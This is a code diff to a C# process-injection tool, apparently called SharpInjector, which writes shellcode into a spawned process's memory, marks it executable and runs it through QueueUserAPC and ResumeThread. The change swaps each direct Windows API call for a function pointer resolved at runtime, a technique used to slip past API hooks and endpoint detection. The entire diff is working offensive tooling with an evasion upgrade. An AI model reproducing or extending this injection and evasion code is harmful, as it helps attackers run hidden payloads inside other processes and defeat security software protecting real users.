@@ -62,27 +62,35 @@ namespace SharpInjector
             Process Target = Process.GetProcessById((int)ProcessInfo.dwProcessId);
 
             Console.WriteLine("[*] Allocating shellcode...");
-            IntPtr Address = WinAPI.VirtualAllocEx(Target.Handle, IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
+            IntPtr pVirtualAllocEx = reprobate.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
+            WinAPI.VirtualAllocEx VirtualAllocEx = Marshal.GetDelegateForFunctionPointer(pVirtualAllocEx, typeof(WinAPI.VirtualAllocEx)) as WinAPI.VirtualAllocEx;
+            IntPtr Address = VirtualAllocEx(Target.Handle, IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
             if (Address == IntPtr.Zero)
             {
                 WinAPI.TerminateProcess(ProcessInfo.hProcess, 0);
                 return;
             }
 
-            if (!WinAPI.WriteProcessMemory(ProcessInfo.hProcess, Address, Shellcode, Shellcode.Length, out bytesWritten))
+            IntPtr pWriteProcessMemory = reprobate.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
+            WinAPI.WriteProcessMemory WriteProcessMemory = Marshal.GetDelegateForFunctionPointer(pWriteProcessMemory, typeof(WinAPI.WriteProcessMemory)) as WinAPI.WriteProcessMemory;
+            if (!WriteProcessMemory(ProcessInfo.hProcess, Address, Shellcode, Shellcode.Length, out bytesWritten))
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                 return;
             }
 
-            if (!WinAPI.VirtualProtectEx(ProcessInfo.hProcess, Address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect))
+            IntPtr pVirtualProtectEx = reprobate.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
+            WinAPI.VirtualProtectEx VirtualProtectEx = Marshal.GetDelegateForFunctionPointer(pVirtualProtectEx, typeof(WinAPI.VirtualProtectEx)) as WinAPI.VirtualProtectEx;
+            if (!VirtualProtectEx(ProcessInfo.hProcess, Address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect))
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                 return;
             }
 
             ProcessThreadCollection CurrentThreads = Process.GetProcessById((int)ProcessInfo.dwProcessId).Threads;
-            IntPtr Thread = WinAPI.OpenThread(WinAPI.ThreadAccess.SET_CONTEXT, false, CurrentThreads[0].Id);
+            IntPtr pOpenThread = reprobate.GetLibraryAddress("kernel32.dll", "OpenThread");
+            WinAPI.OpenThread OpenThread = Marshal.GetDelegateForFunctionPointer(pOpenThread, typeof(WinAPI.OpenThread)) as WinAPI.OpenThread;
+            IntPtr Thread = OpenThread(WinAPI.ThreadAccess.SET_CONTEXT, false, CurrentThreads[0].Id);
             if (Thread == IntPtr.Zero)
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
@@ -90,14 +98,19 @@ namespace SharpInjector
             }
 
             Console.WriteLine("[*] Calling QueueUserAPC...");
-            IntPtr Ptr = WinAPI.QueueUserAPC(Address, Thread, IntPtr.Zero);
+            IntPtr pQueueUserAPC = reprobate.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
+            WinAPI.QueueUserAPC QueueUserAPC = Marshal.GetDelegateForFunctionPointer(pQueueUserAPC, typeof(WinAPI.QueueUserAPC)) as WinAPI.QueueUserAPC;
+
+            IntPtr Ptr = QueueUserAPC(Address, Thread, IntPtr.Zero);
             if (Ptr == IntPtr.Zero)
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                 return;
             }
 
-            uint SuspendCount = WinAPI.ResumeThread(ProcessInfo.hThread);
+            IntPtr pResumeThread = reprobate.GetLibraryAddress("kernel32.dll", "ResumeThread");
+            WinAPI.ResumeThread ResumeThread = Marshal.GetDelegateForFunctionPointer(pResumeThread, typeof(WinAPI.ResumeThread)) as WinAPI.ResumeThread;
+            uint SuspendCount = ResumeThread(ProcessInfo.hThread);
             if (SuspendCount == 0)
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
